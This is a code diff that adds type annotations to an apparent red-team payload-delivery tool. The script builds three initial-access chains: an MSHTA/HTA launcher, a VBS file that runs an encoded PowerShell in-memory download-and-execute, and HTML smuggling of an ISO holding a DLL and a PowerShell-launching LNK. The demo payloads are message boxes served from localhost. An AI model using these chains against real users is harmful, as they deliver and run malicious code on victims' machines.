@@ -17,12 +17,12 @@ def recipe_3():
     routes = []
 
     # PS-A
-    ps1msgbox = makePowershellMessageBox()
-    ps1msgbox = makePowershellEncodedCommand(ps1msgbox)
+    ps1msgbox: AceStr = makePowershellMessageBox()
+    ps1msgbox: AceStr = makePowershellEncodedCommand(ps1msgbox)
 
     # MSHTA
     cmd = AceStr("powershell.exe -EncodedCommand {}".format(ps1msgbox))
-    mshta = makeMshtaJscriptExec(cmd)
+    mshta: AceStr = makeMshtaJscriptExec(cmd)
 
     containerServe: AceRoute = AceRoute('/test.hta', mshta, download=True, downloadName='test.hta')
     routes.append(containerServe)
@@ -36,22 +36,22 @@ def recipe_2():
     routes = []
 
     # PS-A
-    ps1msgbox = makePowershellMessageBox()
+    ps1msgbox: AceStr = makePowershellMessageBox()
     ps1msgboxHtml: AceRoute = AceRoute('/ps-msgbox', ps1msgbox)
     routes.append(ps1msgboxHtml)
 
     # PS-B
-    ps1downloader = makePowershellDownloadAndExecuteMemPs1(
+    ps1downloader: AceStr = makePowershellDownloadAndExecuteMemPs1(
         url='http://localhost:5000/ps-msgbox',
     )
 
     # VBS
-    ps1downloader = makePowershellEncodedCommand(ps1downloader)
-    vbsExec = makeVbsExecEncPs1(ps1downloader)
-    vbsExecFile = makeAceFile('test.vbs', vbsExec)
+    ps1downloader: AceStr = makePowershellEncodedCommand(ps1downloader)
+    vbsExec: AceStr = makeVbsExecEncPs1(ps1downloader)
+    vbsExecFile: AceFile = makeAceFile('test.vbs', vbsExec)
 
     # ZIP
-    container: bytes = makeZip(
+    container: AceBytes = makeZip(
         files = [
             vbsExecFile,
         ],
@@ -67,15 +67,15 @@ def recipe_1():
     # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )
 
     # DLL
-    dllData: bytes = readFileContent('payloads/evil.dll')
+    dllData: AceBytes = readFileContent('payloads/evil.dll')
     dllFile: AceFile = makeAceFile('evil.dll', dllData)
 
-    psMsgbox = makePowershellMessageBox()
+    psMsgbox: AceStr = makePowershellMessageBox()
     # LNK to powershell.exe to execute DLL
-    execData: str = makePowershellEncodedCommand(
+    execData: AceStr = makePowershellEncodedCommand(
         input=psMsgbox,
     )
-    lnkData: bytes = makeLnk(
+    lnkData: AceBytes = makeLnk(
         name = "clickme.lnk",
         target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         arguments = "-noexit -EncodedCommand {}".format(execData),
@@ -83,7 +83,7 @@ def recipe_1():
     lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
     # Pack DLL and LNK into ISO
-    container: bytes = makeIso(
+    container: AceBytes = makeIso(
         files = [
             dllFile,
             lnkFile,
@@ -92,7 +92,7 @@ def recipe_1():
     containerFile: AceFile = makeAceFile('test.iso', container)
 
     # HTML to serve ISO
-    html: str = makeHtmlSmuggling(
+    html: AceStr = makeHtmlSmuggling(
         containerFile,
         template='autodownload.html',
     )
